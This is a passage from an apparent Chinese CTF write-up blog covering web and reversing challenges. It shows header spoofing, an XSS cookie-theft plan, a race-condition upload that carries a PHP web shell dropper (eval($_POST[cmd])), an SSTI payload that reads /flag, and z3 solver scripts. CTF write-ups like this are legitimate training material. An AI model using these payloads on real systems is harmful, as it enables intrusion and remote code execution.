class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.248.97.213:30090/flagflagflaghhh.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="comment">#&#x27;a&#x27;: &#x27;vme50&#x27;+&#x27;!&#x27;*279620100</span></span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;vme50&#x27;</span>+<span class="string">&#x27;0&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><code>flag&#123;haHa_tHiS_Is_V_mE50_F1@G&#125;</code></p><h2 id="KFC"><a href="#KFC" class="headerlink" title="KFC"></a>KFC</h2><blockquote><p> ä¸»è¦è€ƒç‚¹ï¼šHTTP headerå„å­—æ®µçš„å«ä¹‰åŠæ ¼å¼</p></blockquote><p>è¿›å…¥é¢˜ç›®è¿æ¥ï¼Œé™¤äº†ä¸€å¼ æ— æ„ä¹‰çš„å›¾ç‰‡ä¹‹å¤–å°±æ˜¯<code>Are you come from localhost?</code><br>çŒœæµ‹ä¿®æ”¹XFFï¼Œå³<code>X-Forwarded-For: 127.0.0.1</code></p><p>å‘åŒ…è¿”å›<code>Are you jump from KFC&#39;s website?(http:****.cn)</code><br>çŒœæµ‹ä¿®æ”¹Refererï¼Œæœç´¢kfcçš„ç½‘å€<code>https://kfcapp.cn/</code>ï¼Œå³<code>Referer: https://kfcapp.cn/</code></p><p>å‘åŒ…è¿”å›<code>Have you v me 50?</code><br>è¿™ä¸‹ä¸æ‡‚äº†ï¼Œä½†æ˜¯ä»”ç»†è§‚å¯Ÿå‘ç°è¿”å›çš„åŒ…ä¸­headerå¤šäº†ä¸€ä¸ªmoneyçš„å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sat, 26 Oct 2024 17:57:44 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.10 (Debian) PHP&#x2F;5.4.45</span><br><span class="line">X-Powered-By: PHP&#x2F;5.4.45</span><br><span class="line">money: 0</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 106</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">&lt;p style&#x3D;&quot;text-align: center;&quot;&gt;&lt;img src&#x3D;&quot;.&#x2F;v50.jpg&quot; alt&#x3D;&quot;&quot; width&#x3D;132px height&#x3D;188px&gt; &lt;&#x2F;p&gt;Have you v me 50?</span><br></pre></td></tr></table></figure><p>æ•…çŒœæµ‹åœ¨headerå¢åŠ ä¸€ä¸ªmoneyçš„å­—æ®µï¼Œå€¼ä¸º50ï¼Œå³<code>money: 50</code></p><p><code>flag&#123;0k_!_G1v3_Y0u_th3_f1l@g_!_!&#125; </code></p><h2 id="kkå›­åŒºå®¡æ ¸å‘˜"><a href="#kkå›­åŒºå®¡æ ¸å‘˜" class="headerlink" title="kkå›­åŒºå®¡æ ¸å‘˜"></a>kkå›­åŒºå®¡æ ¸å‘˜</h2><p><code>å–„è‰¯çš„å‡ºé¢˜äººç»„ç»‡äº†ä¸€æ¬¡kkå›­åŒºçš„å‚è§‚æ´»åŠ¨ï¼Œç°åœ¨æ”¶é›†æœ‰æ„å‘å‰å¾€çš„äººå‘˜ä¿¡æ¯ï¼Œæäº¤åå·¥ä½œäººå‘˜ä¼šç¬¬ä¸€æ—¶é—´å®¡æ ¸å“¦ï¼Œå®¡æ ¸é€šè¿‡è¿˜èƒ½å¾—åˆ°å®¡æ ¸çš„ç¾å‘³æ›²å¥‡å¥–åŠ±ï¼</code></p><p>å¡«è¡¨ - æäº¤ - å®¡æ ¸cookie<br>çŒœæµ‹æ˜¯xss cookieå¤–å¸¦</p><ul><li>æ‰¾xsså¹³å°</li><li>å¤åˆ¶payloadå¹¶å¡«è¡¨</li><li>æäº¤å¹¶è¿”å›xsså¹³å°çœ‹è®°å½•</li></ul><p><a href="https://xssaq.com/login/">XSSå¹³å°-XSSæµ‹è¯•ç½‘ç«™-ä»…ç”¨äºå®‰å…¨å…è´¹æµ‹è¯• (xssaq.com)</a></p><h2 id="reallyExpensive"><a href="#reallyExpensive" class="headerlink" title="reallyExpensive"></a>reallyExpensive</h2><p><img src="https://s2.loli.net/2024/11/05/7DyE3iWUVufhmX4.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/7DyE3iWUVufhmX4.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026145214.png"><br>ç»™äº†åå—é’±çš„ä½™é¢è¦ä¹°å¥½è´µçš„flag<br>æŠ“åŒ…æ”¹è´­ä¹°çš„æ•°ç›®<br><img src="https://s2.loli.net/2024/11/05/b1J2kXoOKpUf6c7.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/b1J2kXoOKpUf6c7.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026145318.png"></p><p><code>flag&#123;^==^Y0uG@t$(t]$[r)^u^(e)-F10g!^&lt;&gt;^&#125;</code></p><h2 id="upload-quick"><a href="#upload-quick" class="headerlink" title="upload_quick"></a>upload_quick</h2><p>è¿›å…¥é¡µé¢ä»€ä¹ˆä¹Ÿå¹²ä¸äº†ï¼Œæ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„<br>æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢è—åœ¨jsæ–‡ä»¶é‡Œ</p><p>æ ¹æ®é¢˜ç›®çŒœæµ‹æ¡ä»¶ç«äº‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Upl00000000ad.php HTTP&#x2F;1.1</span><br><span class="line">Host: 43.248.97.213:30014</span><br><span class="line">Content-Length: 331</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;127.0.0.0 Safari&#x2F;537.36 Edg&#x2F;127.0.0.0</span><br><span class="line">Origin: http:&#x2F;&#x2F;43.248.97.213:30014</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</span><br><span class="line">Referer: http:&#x2F;&#x2F;43.248.97.213:30014&#x2F;Upl00000000ad.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: JSESSIONID&#x3D;886AD2DD7B34B204841F70E0D9696242</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39; ); ?&gt;</span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Ã¤Â¸ÂŠÃ¤Â¼ </span><br><span class="line">------WebKitFormBoundaryY7TKFDA8ZwPEXpcS--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡å¤å‘åŒ…çš„åŒæ—¶è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œç”Ÿæˆshell.phpï¼Œç„¶åè¿œç¨‹è¿æ¥å°±å¯ä»¥äº†</p><p><code>flag&#123;9d097988-5eae-4c3b-86ac-d9b53ce4f340&#125;</code></p><h2 id="ä½ ä¹°è½¦ç¥¨æ²¡"><a href="#ä½ ä¹°è½¦ç¥¨æ²¡" class="headerlink" title="ä½ ä¹°è½¦ç¥¨æ²¡"></a>ä½ ä¹°è½¦ç¥¨æ²¡</h2><p>é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œéœ€è¦è¾“å…¥è´¦å·å¯†ç ï¼Œä½†æ˜¯å¥½åƒä¸æ˜¯sqlæ³¨å…¥ï¼ˆå› ä¸ºæµ‹ä¸å‡ºæ¥ï¼‰<br>æ¯æ¬¡æäº¤éƒ½ä¼šå¼¹çª—<code>xxx,æ²¡ä¹°è½¦ç¥¨ä¸èƒ½ä¸Šè½¦!!!</code><br>ä½†æ˜¯åœ¨è¿”å›çš„é¡µé¢ä¸­å¹¶æ²¡æœ‰çœ‹åˆ°jsä»£ç æˆ–è€…è¯·æ±‚çš„jsæ–‡ä»¶<br><img src="https://s2.loli.net/2024/11/05/RAQpXqnZdsByFg4.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/RAQpXqnZdsByFg4.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215016.png"></p><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä½¿ç”¨phpåŠ¨æ€ç”Ÿæˆçš„jsä»£ç ï¼Œä½†æ˜¯æ²¡æœ‰æ€è·¯<br>åé¢ç»è¿‡æ‘¸ç´¢å‘ç°æ˜¯sstiæ¨¡æ¿æ³¨å…¥ï¼Œå› ä¸ºæ¯æ¬¡è¾“å…¥çš„ç”¨æˆ·åéƒ½ä¼šå›æ˜¾ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨<code>&#123;&#123; 4-1 &#125;&#125;</code>è¿™æ ·çš„è¾“å…¥æµ‹è¯•ï¼Œå¦‚æœè¿”å›3å°±è¯´æ˜å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥<br><img src="https://s2.loli.net/2024/11/05/8ztdjws7mGfyO5J.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/8ztdjws7mGfyO5J.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215101.png"></p><p>ç¡®å®šäº†å­˜åœ¨æ¨¡æ¿æ³¨å…¥ä¹‹åï¼Œè¿˜è¦ç¡®å®šæ€ä¹ˆå†™payload<br><a href="https://xz.aliyun.com/t/3679?time__1311=n4+xnii=oGqmqDK0QDODlx6e0=bYhq3+hS+iD">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>payloadæœ‰å¾ˆå¤šç§ï¼Œä¸€èˆ¬æ˜¯ä»å­—ç¬¦ä¸²æˆ–è€…åˆ—è¡¨å‡ºå‘ï¼Œå‘ä¸Šæ‰¾åŸºç±»ï¼Œç„¶åä»åŸºç±»å¾€ä¸‹æ‰¾å¯ä»¥è¯»å–æ–‡ä»¶çš„å‡½æ•°<br>è¿™é‡Œä½¿ç”¨çš„payloadï¼š<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[99]['get_data'](0,"/flag")&#125;&#125;</code></p><p>ä¸€èˆ¬åˆ°subclassesä¹‹åå°±éœ€è¦æ‰‹åŠ¨æ‰¾ç›®æ ‡å‡½æ•°ï¼Œç„¶åä¼ å…¥éœ€è¦è¯»çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œè¿™é‡Œæ‰¾åˆ°çš„æ˜¯<code>FileLoader</code><br><img src="https://s2.loli.net/2024/11/05/Wi46qrVlchyZwt1.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/Wi46qrVlchyZwt1.png" srcset="data:image/png;base64,666" alt="Pasted image 20241031215137.png"></p><p><code>XSCTF&#123;SsT1_MilKTea_m1LktEa!&#125;</code></p><h2 id="éšç§˜çš„backdoor"><a href="#éšç§˜çš„backdoor" class="headerlink" title="éšç§˜çš„backdoor"></a>éšç§˜çš„backdoor</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">$cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]))&#123;    phpinfo();  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä¸è¦è¿™æ ·ï¼TuT&quot;</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    $cmd = $_POST[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line">    <span class="keyword">eval</span>($cmd);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢äº†å¾ˆå¤šç»•è¿‡çš„æ–¹å¼ï¼Œè¿˜æ˜¯ä¸è¡Œ<br>ç„¶åçœ‹äº†çœ‹phpçš„ç‰ˆæœ¬ï¼ŒæŸ¥åˆ°äº†è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´</p><p><img src="https://s2.loli.net/2024/11/05/jpeT8Ns1dAkIufM.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/jpeT8Ns1dAkIufM.png" srcset="data:image/png;base64,666" alt="Pasted image 20241026174307.png"></p><p>å…·ä½“ä¸Šç½‘æœ</p><p><code>flag&#123;B@ck_do0r_!_B4ck_d0or_!&#125;</code></p><h2 id="calculate"><a href="#calculate" class="headerlink" title="calculate"></a>calculate</h2><p>æŸ¥å£³ï¼Œå‘ç°upxï¼Œ<code>upx.exe -d calculate.exe</code><br>ç„¶åæ‰”è¿›idaï¼Œå‘ç°è¿™ä¹ˆä¸€ä¸ªå‡½æ•°<br><img src="https://s2.loli.net/2024/11/05/JsoIkSvtbaWhfqP.png" class="lazyload" data-srcset="https://s2.loli.net/2024/11/05/JsoIkSvtbaWhfqP.png" srcset="data:image/png;base64,666" alt="Pasted image 20241025211214.png"></p><p>ç™¾åº¦ä¸‹å«çº¦æŸæ±‚è§£ï¼ˆçœ‹èµ·æ¥æœ‰ç‚¹åƒçŸ©é˜µè¿ç®—ï¼‰<br>1000å¤šè¡Œæ‰‹å·¥æå–ä¸å®é™…ï¼Œå†™ä¸ªè„šæœ¬å¤„ç†ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;asd.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">final = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;return 0i64;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> i:</span><br><span class="line">        tmp += i.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        final.append(tmp)</span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">print(final)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> final:</span><br><span class="line">        f.write(i+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åˆæ­¥å¤„ç†ä¹‹åæ‰‹åŠ¨åˆ å»å‰åç¼€ï¼Œå°±å¾—åˆ°äº†å…¬å¼ï¼ˆå­—ç¬¦ä¸²ç‰ˆï¼‰</p><p>ç„¶åä½¿ç”¨pythonä¸­ä¸€ä¸ªå«z3çš„åº“ï¼Œä¸“é—¨ç”¨æ¥æ±‚è§£è¿™ç§æ–¹ç¨‹ç»„<br>å…¶ä¸­æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥å°†å­—ç¬¦ä¸²ç‰ˆçš„æ–¹ç¨‹è½¬æ¢ä¸ºpythonå¯ä»¥å¤„ç†çš„è¡¨è¾¾å¼</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ¨¡æ¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver_eng</span>(<span class="params">fc</span>):</span></span><br><span class="line">    <span class="comment"># åˆ›å»ºè§£é‡Šå™¨å¯¹è±¡</span></span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="comment"># æ·»åŠ çº¦æŸæ–¹ç¨‹</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fc)):</span><br><span class="line">        solver.add(<span class="built_in">eval</span>(fc[i])) <span class="comment">#evalå‡½æ•°ä¼šå°†å­—ç¬¦ä¸²å½¢å¼çš„æ–¹ç¨‹è½¬æ¢ä¸ºz3æ¨¡å—èƒ½è§£æçš„æ–¹ç¨‹</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ±‚è§£å¹¶è½¬åŒ–ä¸ºå­—ç¬¦è¾“å‡ºï¼Œå¾—åˆ°flag</span></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:  <span class="comment"># check()æ–¹æ³•ç”¨æ¥åˆ¤æ–­æ˜¯å¦æœ‰è§£ï¼Œsat(å³satisify)è¡¨ç¤ºæ»¡è¶³æœ‰è§£</span></span><br><span class="line">        ans = solver.model()  <span class="comment"># model()æ–¹æ³•å¾—åˆ°è§£</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">            print(<span class="built_in">chr</span>(ans[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># ä¸€èˆ¬ä¸ä¼šæ— è§£ï¼Œå¦‚æœæ— è§£å…«æˆæ˜¯æœªçŸ¥æ•°å˜é‡çš„ç±»å‹ä¸ç¬¦åˆï¼Œæˆ–çº¦æŸæ–¹ç¨‹æ·»åŠ é”™è¯¯</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;no ans!&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># è®¾ç½®æ–¹ç¨‹ï¼Œè¯·ç”¨è„šæœ¬å°†æ¡ä»¶ä¸­çš„æ‰€æœ‰æ–¹ç¨‹å¤„ç†æˆåˆ—è¡¨ï¼Œç„¶åèµ‹å€¼ç»™fcåˆ—è¡¨ï¼ˆè¿™æ ·ä½ å°±ä¸ç”¨ä¸€ä¸ªä¸€ä¸ªæ–¹ç¨‹æ…¢æ…¢å»å¤åˆ¶äº†ï¼‰</span></span><br><span class="line">    fc = []</span><br><span class="line">    <span class="comment"># åˆ›å»ºæœªçŸ¥æ•°å˜é‡</span></span><br><span class="line">    v = [Int(<span class="string">f&#x27;v<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fc))]</span><br><span class="line"> </span><br><span class="line">    solver_eng(fc)</span><br></pre></td></tr></table></figure><p>æ ¹æ®é¢˜ç›®ä¿®æ”¹ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solver_eng</span>(<span class="params">fc</span>):</span></span><br><span class="line">    solver = Solver()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fc)):</span><br><span class="line">        solver.add(<span class="built_in">eval</span>(fc[i]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        ans = solver.model()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">            print(<span class="built_in">chr</span>(ans[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fc = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        fc.append(i.strip())</span><br><span class="line">    v = [Int(<span class="string">f&#x27;v<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fc))]</span><br><span class="line">    </span><br><span class="line">    solver_eng(fc)</span><br></pre></td></tr></table></figure><p><code>flag&#123;n0w_y0u_know_UPX!&#125;</code></p><p><a href="https://blog.csdn.net/liKeQing1027520/article/details/138047537">z3æ±‚è§£å™¨è„šæœ¬ï¼ˆCTF-reverseå¿…å¤‡ï¼‰_ctf z3-CSDNåšå®¢</a></p><h2 id="call-above-call"><a href="#call-above-call" class="headerlink" title="call_above_call"></a>call_above_call</h2><p>æ ¸å¿ƒä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// bad sp value at call has been detected, the output may be wrong!</span><br><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp<span class="number">-14</span>h] [ebp<span class="number">-90</span>h]</span><br><span class="line">  <span class="built_in">int</span> v5; // [esp<span class="number">-10</span>h] [ebp<span class="number">-8</span>Ch]</span><br><span class="line">  <span class="built_in">int</span> v6; // [esp-Ch] [ebp<span class="number">-88</span>h]</span><br><span class="line">  <span class="built_in">int</span> v7; // [esp<span class="number">-8</span>h] [ebp<span class="number">-84</span>h]</span><br><span class="line">  <span class="built_in">int</span> v8; // [esp<span class="number">-4</span>h] [ebp<span class="number">-80</span>h]</span><br><span class="line">  <span class="built_in">int</span> v9; // [esp+<span class="number">0</span>h] [ebp<span class="number">-7</span>Ch]</span><br><span class="line">  <span class="built_in">int</span> v10; // [esp+<span class="number">4</span>h] [ebp<span class="number">-78</span>h]</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+<span class="number">4</span>h] [ebp<span class="number">-78</span>h]</span><br><span class="line">  <span class="built_in">int</span> v12; // [esp+<span class="number">8</span>h] [ebp<span class="number">-74</span>h]</span><br><span class="line">  char s[<span class="number">100</span>]; // [esp+Ch] [ebp<span class="number">-70</span>h] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v14; // [esp+<span class="number">70</span>h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> *p_argc; // [esp+<span class="number">74</span>h] [ebp<span class="number">-8</span>h]</span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v12 = generate();</span><br><span class="line">  printf(<span class="string">&quot;input your key:&quot;</span>);</span><br><span class="line">  ((void (__stdcall *)(const char *, char *, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>))__isoc99_scanf)(</span><br><span class="line">    <span class="string">&quot;%s&quot;</span>,</span><br><span class="line">    s,</span><br><span class="line">    v4,</span><br><span class="line">    v5,</span><br><span class="line">    v6,</span><br><span class="line">    v7,</span><br><span class="line">    v8,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    v10,</span><br><span class="line">    v12);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(s) != <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;Sorry!&quot;</span>);</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wuhuwuhu((<span class="built_in">int</span>)s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != *(_BYTE *)(enc + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      <span 